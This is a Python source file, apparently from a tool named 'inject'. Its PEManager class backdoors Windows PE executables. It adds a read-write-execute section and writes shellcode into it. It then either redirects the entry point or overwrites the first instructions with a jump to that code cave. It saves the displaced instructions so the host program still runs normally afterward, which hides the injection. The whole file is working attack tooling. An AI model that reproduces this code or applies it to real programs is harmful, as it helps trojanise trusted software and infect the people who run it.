from __future__ import annotations
from typing import List, Any
import sys
from struct import pack, unpack
from pefile import PE
from capstone import Cs, CS_ARCH_X86, CS_MODE_32
from inject.shellcode import Shellcode
from inject.output import Output
from inject.utils import printhexi, align, byteslash, hexstr
from inject.enums import HEADER_SIZE, RWE_CHARACTERISTIC, IX86_JUMP
from inject.common import CommonMixin


class PEManager(CommonMixin):
    def __init__(self, output: Output, options: dict = None):
        self.output = output
        self.pe = PE(str(self.output))
        # Verbosity
        options = options or {}
        super().__init__(options)

    def dump_basic_info(self):
        self.out("[*] Number of Sections:", self.number_of_sections())
        self.outhexi("File Alignment", self.file_alignment())
        self.outhexi("Section Alignment", self.section_alignment())
        self.outhexi("Virtual Offset", self.virtual_offset())
        self.outhexi("Aligned Virtual Offset", self.aligned_virtual_offset())
        self.outhexi("Raw Offset", self.raw_offset())
        self.outhexi("Aligned Raw Offset", self.aligned_raw_offset())

    def number_of_sections(self) -> int:
        return self.pe.FILE_HEADER.NumberOfSections

    def address_of_entry_point(self):
        return self.pe.OPTIONAL_HEADER.AddressOfEntryPoint

    def address_of_entry_point_rel(self):
        return self.pe.OPTIONAL_HEADER.AddressOfEntryPoint + self.image_base()

    def size_of_image(self):
        return self.pe.OPTIONAL_HEADER.SizeOfImage

    def image_base(self):
        return self.pe.OPTIONAL_HEADER.ImageBase

    def last_section(self):
        return self.pe.sections[self.number_of_sections() - 1]

    def file_alignment(self):
        return self.pe.OPTIONAL_HEADER.FileAlignment

    def section_alignment(self):
        return self.pe.OPTIONAL_HEADER.SectionAlignment

    def virtual_offset(self):
        return self.last_section().VirtualAddress + self.last_section().Misc_VirtualSize

    def aligned_virtual_offset(self):
        return align(self.virtual_offset(), self.section_alignment())

    def raw_offset(self):
        return self.last_section().PointerToRawData + self.last_section().SizeOfRawData

    def aligned_raw_offset(self):
        return align(self.raw_offset(), self.file_alignment())

    def get_aligned_virtual_size(self, shellcode: Shellcode):
        return align(shellcode.get_final_size(), self.section_alignment())

    def get_aligned_raw_size(self, shellcode: Shellcode):
        return align(shellcode.get_final_size(), self.file_alignment())

    def new_section_offset(self):
        return self.last_section().get_file_offset() + HEADER_SIZE

    def get_encoded_name(self, name: str) -> bytes:
        name_padding_len = 8 - len(name.encode())
        bname = name.encode() + (name_padding_len * b"\x00")
        return bname

    def normalize_name(self, name: str):
        if name[0] != ".":
            name = "." + name
        if len(name) > 8:
            print(f"Name '{name}' cannot be greater than 8 bytes")
            sys.exit(1)
        return name

    def save(self):
        self.save_changes()
        self.refresh()

    # write xor stub to somewhere
    def write_shellcode_stub(self, shellcode: Shellcode):
        pass

    # write encoded shellcode to new section
    def write_shellcode_blob(self, shellcode: Shellcode):
        pass

    # write shellcode to new section
    def write_shellcode(self, shellcode: Shellcode):
        raw_offset = self.last_section().PointerToRawData
        self.outhexi("Raw Offset for Injection", raw_offset)
        self.outhexi("Writing shellcode to offset", raw_offset, level=2)
        self.pe.set_bytes_at_offset(raw_offset, bytes(shellcode))

    def enter_at_last_section(self) -> PEManager:
        self.outhexi("Original Entry Point", self.address_of_entry_point())
        self.out(f"[*] New Last Section Name: {self.last_section().Name.decode()}")
        new_entry_point = self.last_section().VirtualAddress
        self.pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_entry_point
        self.outhexi("New Entry Point", new_entry_point, level=2)
        return self
        # adds new section to the end of the PE file

    # Overwrite first (or multiple) instructiosn with jump to cave
    def enter_with_jump(self, shellcode: Shellcode) -> PEManager:
        jump_ops = self.build_jump_ops()
        restore_data = self.find_jump_restore_data(jump_ops)

        # Provide Shellcode with necessary information
        if shellcode.restorer.should_restore:
            self.out("-- Restore Info --")
            self.out("[*] Saving Restore Data For Later")
            shellcode.set_restore_data(restore_data)
            shellcode.set_restore_ep_relative(self.address_of_entry_point_rel())
            cave_address = self.image_base() + self.last_section().VirtualAddress
            shellcode.set_restore_cave_address(cave_address)
            jump_to_address = self.address_of_entry_point_rel() + len(restore_data)
            shellcode.set_restore_jump_to_address(jump_to_address)
            self.out("-- Restore Operations --")
            self.outins(self.get_ins_from_data(restore_data))

        eop = self.address_of_entry_point()
        if len(jump_ops) < len(restore_data):
            nops_num = len(restore_data) - len(jump_ops)
            fill = b"\x90" * nops_num
            post_jmp_offset = eop + len(jump_ops)
            self.out(f"[*] Packing {nops_num} Nops at rva {hexstr(post_jmp_offset)}")
            self.pe.set_bytes_at_rva(post_jmp_offset, fill)
        else:
            self.out("[*] No nop pack necessary")

        self.out(f"[*] Writing jump operation at rva {hexstr(eop)}")
        self.pe.set_bytes_at_rva(eop, jump_ops)
        return self

    def build_jump_ops(self):
        last_section_start = self.last_section().VirtualAddress
        jump_distance = last_section_start - self.address_of_entry_point() - 5
        self.outhexi("Jump From", self.address_of_entry_point())
        self.outhexi("Jump To", last_section_start)
        self.outhexi("Jump Distance", jump_distance)
        jump_distance = pack("I", jump_distance)
        jump_ops = IX86_JUMP + jump_distance
        self.out(f"[*] Jump Operation: {byteslash(jump_ops)}")
        self.out(f"[*] Jump Op Size: {len(jump_ops)}")
        return jump_ops

    def find_jump_restore_data(self, jump_ops: bytes) -> bytes:
        eop = self.address_of_entry_point()
        restore_data = self.pe.get_memory_mapped_image()[eop : eop + len(jump_ops) + 30]
        md = Cs(CS_ARCH_X86, CS_MODE_32)
        offset = 0
        for i_caps in md.disasm(restore_data, eop + self.image_base()):
            offset += len(i_caps.bytes)
            if offset >= len(jump_ops):
                break

        # regrab instructions so it doesn't split on offset (grab whole instructions)
        restore_data = self.pe.get_memory_mapped_image()[eop : eop + offset]
        return restore_data

    def update_restore_data_for_rel(self, restore_data):
        pass

    def create_new_section(self, shellcode: Shellcode, name: str) -> PEManager:
        name = self.normalize_name(name)
        # lets take our size of the new section, and align that as well
        aligned_virtual_size = self.get_aligned_virtual_size(shellcode)
        self.outhexi("Aligned Virtual Size", aligned_virtual_size)
        aligned_raw_size = self.get_aligned_raw_size(shellcode)
        self.outhexi("Aligned Raw Size", aligned_raw_size)

        # write the new section header
        self.out("[*] Writing Data")
        self.outhexi("New Section Offset", self.new_section_offset())

        # Set the name
        self.write_name(name)
        self.write_aligned_virtual_size(aligned_virtual_size)
        self.write_aligned_virtual_offset(self.aligned_virtual_offset())
        self.write_aligned_raw_size(aligned_raw_size)
        self.write_aligned_raw_offset(self.aligned_raw_offset())
        self.write_nothing(12 * b"\x00")
        self.write_characteristics(RWE_CHARACTERISTIC)
        # grab the new size before incrementing the number of sections
        new_image_size = aligned_virtual_size + self.aligned_virtual_offset()
        self.increment_number_of_sections()
        self.update_size_of_image(new_image_size)
        self.save_changes()
        return self.regenerate()

    def write_name(self, name: str):
        name = self.get_encoded_name(name)
        self.out(f"[*] Writing name {name} to new section offset")
        self.pe.set_bytes_at_offset(self.new_section_offset(), name)

    def write_aligned_virtual_size(self, aligned_virtual_size):
        dst = self.new_section_offset() + 8
        self.outhexi("Writing aligned virtual size to", dst)
        self.pe.set_dword_at_offset(dst, aligned_virtual_size)

    def write_aligned_virtual_offset(self, aligned_virtual_offset):
        dst = self.new_section_offset() + 12
        self.outhexi("Writing aligned virtual offset to", dst)
        self.pe.set_dword_at_offset(dst, aligned_virtual_offset)

    def write_aligned_raw_size(self, aligned_raw_size):
        dst = self.new_section_offset() + 16
        self.outhexi("Writing aligned raw size to", dst)
        self.pe.set_dword_at_offset(dst, aligned_raw_size)

    def write_aligned_raw_offset(self, aligned_raw_offset):
        dst = self.new_section_offset() + 20
        self.outhexi("Writing aligned raw offset to", dst)
        self.pe.set_dword_at_offset(dst, aligned_raw_offset)

    def write_nothing(self, nothing):
        dst = self.new_section_offset() + 24
        self.outhexi("Writing nothing to", dst)
        self.pe.set_bytes_at_offset(dst, nothing)

    def write_characteristics(self, characteristics):
        dst = self.new_section_offset() + 36
        self.outhexi("Writing characteristics to", dst)
        self.pe.set_dword_at_offset(dst, characteristics)

    def increment_number_of_sections(self):
        _original = self.number_of_sections()
        self.pe.FILE_HEADER.NumberOfSections += 1
        self.out(
            f"[*] Increasing section number from {_original} to {self.pe.FILE_HEADER.NumberOfSections}",
            level=2,
        )

    def update_size_of_image(self, new_image_size):
        _orginal_image_size = self.pe.OPTIONAL_HEADER.SizeOfImage
        self.outhexi("Original SizeOfImage", _orginal_image_size)
        self.pe.OPTIONAL_HEADER.SizeOfImage = new_image_size
        self.outhexi("New SizeOfImage", self.pe.OPTIONAL_HEADER.SizeOfImage)

    def save_changes(self):
        self.out(f"[*] Writing changes to {str(self.output)}")
        self.pe.write(str(self.output))

    def refresh(self):
        self.out(f"[*] Refreshing PE in current PEManager: {str(self.output)}")
        self.pe = PE(str(self.output))

    def regenerate(self):
        self.out(f"[*] Regenerating PE with new PEManager: {str(self.output)}")
        new_pem = PEManager(self.output)
        return new_pem

    def get_ins(self, start: int = -1, take: int = 8, offset: int = -1):
        start = start if start >= 0 else self.address_of_entry_point()
        offset = offset if offset >= 0 else self.address_of_entry_point_rel()
        data = self.pe.get_memory_mapped_image()[start : start + 32]
        return self.get_ins_from_data(data, take, offset)

